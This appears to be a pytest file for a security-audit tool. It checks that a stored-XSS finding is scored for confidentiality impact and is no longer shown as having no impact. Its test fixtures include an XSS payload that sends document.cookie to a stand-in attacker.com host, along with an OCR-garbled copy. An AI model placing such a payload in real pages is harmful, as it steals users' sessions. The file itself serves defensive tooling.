# -*- coding: utf-8 -*-
""""No impact" and "impact unknown" are different answers.

    pytest tests/test_cia_impact_inference.py -v

WHY THIS EXISTS

A stored-XSS proof of concept recovered from a Burp screenshot was shown to the
auditor as:

    CIA IMPACT    C:NONE | I:NONE | A:NONE

on a finding rated HIGH (7.5). The payload in its own evidence steals the
session cookie and posts it to an attacker-controlled host.

Two separate faults produced that.

1. Cross-site scripting was listed only under integrity. Even with perfect
   input, the textbook XSS payload -- stealing document.cookie -- reported
   C:NONE, because no confidentiality keyword covered it.

2. The inference is keyword-based and the text came from OCR, which read
   "Stored XSS]" as "Stored XSSI" and "document.cookie" as "documentcookie".
   _kw_hit is word-boundary anchored on purpose (so "dos" cannot match inside a
   base64 cookie), so none of those matched anything, and every metric stayed at
   its NONE default.

The default is the real problem. Reaching the end with all three NONE means
nothing was established, but it printed as a positive finding of no impact --
which an auditor may act on by deprioritising a live vulnerability. It is also
self-contradictory: C:N/I:N/A:N scores 0.0 under CVSS 3.1 and cannot coexist
with a HIGH rating, the same contradiction this module already documents for
SSRF, where the resolution was to let the CVSS vector win. With no vector to
win, the honest answer is to say it was not determined.
"""
import pytest

from src.core.parsers.control_mapper import (
    _C_HIGH_KEYWORDS, _I_HIGH_KEYWORDS, _kw_hit,
    evaluate_cia_and_pii_impact,
)


class _F(object):
    """A Finding, as evaluate_cia_and_pii_impact() reads one."""

    def __init__(self, title="", description="", evidence="", remediation="",
                 severity="HIGH", source_tool="Burp Suite", cvss_vector=""):
        self.title = title
        self.description = description
        self.evidence = evidence
        self.remediation = remediation
        self.severity = severity
        self.source_tool = source_tool
        self.cvss_vector = cvss_vector


def _cia(**kw):
    return evaluate_cia_and_pii_impact(_F(**kw))[0]


# ── the reported finding ─────────────────────────────────────────────────────

def test_the_ocr_finding_no_longer_claims_no_impact():
    """The exact text OCR produced, on a HIGH finding."""
    out = _cia(title="Visual PoC: Vulnerability Proof Stored XSSI",
               description="OCR extracted vulnerability proof-of-concept: "
                           "Vulnerability Proof Stored XSSI",
               evidence="bio:<script-tetch(http/ attacker.com/stealc='+ "
                        "documentcookie)</script>")
    assert "NONE" not in out, (
        "a HIGH finding is still reported as having no impact at all: %r" % out)
    assert "determined" in out.lower(), out


def test_a_clean_xss_gets_both_confidentiality_and_integrity():
    """With readable text the class is recognised and scored."""
    out = _cia(title="Visual PoC: Stored XSS",
               description="Stored cross-site scripting",
               evidence="<script>fetch('http://attacker.com/steal?c='"
                        "+document.cookie)</script>")
    assert "C:HIGH" in out, "stored XSS steals the session cookie: %r" % out
    assert "I:HIGH" in out, out


def test_xss_is_a_confidentiality_keyword_now():
    """It was listed only under integrity."""
    assert _kw_hit("stored xss", _C_HIGH_KEYWORDS)
    assert _kw_hit("cross-site scripting", _C_HIGH_KEYWORDS)
    assert _kw_hit("stored xss", _I_HIGH_KEYWORDS), "integrity must still match"


# ── what must not change ─────────────────────────────────────────────────────

def test_an_informational_finding_may_still_be_all_none():
    """INFO items legitimately carry no impact; the guard skips them."""
    out = _cia(title="Server banner", description="Server header disclosed",
               evidence="Server: nginx", severity="INFO")
    assert "determined" not in out.lower(), out


def test_a_cvss_vector_still_wins():
    """An explicit vector is a measurement, not an inference."""
    out = _cia(title="Some finding", description="d",
               evidence="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
               cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N")
    assert "C:NONE" in out and "I:LOW" in out, (
        "the CVSS vector no longer decides the metrics: %r" % out)


def test_a_vector_of_all_none_is_reported_as_measured():
    """C:N/I:N/A:N from a real vector is a determination, not a default."""
    v = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"
    out = _cia(title="f", description="d", evidence=v, cvss_vector=v)
    assert out == "C:NONE | I:NONE | A:NONE", out


def test_findings_with_a_real_class_are_unaffected():
    for text, expect in (("SQL injection in login form", "I:HIGH"),
                         ("Denial of service via resource exhaustion", "A:HIGH"),
                         ("Path traversal allows arbitrary file read", "C:HIGH")):
        out = _cia(title=text, description=text, evidence=text)
        assert expect in out, "%r -> %r" % (text, out)
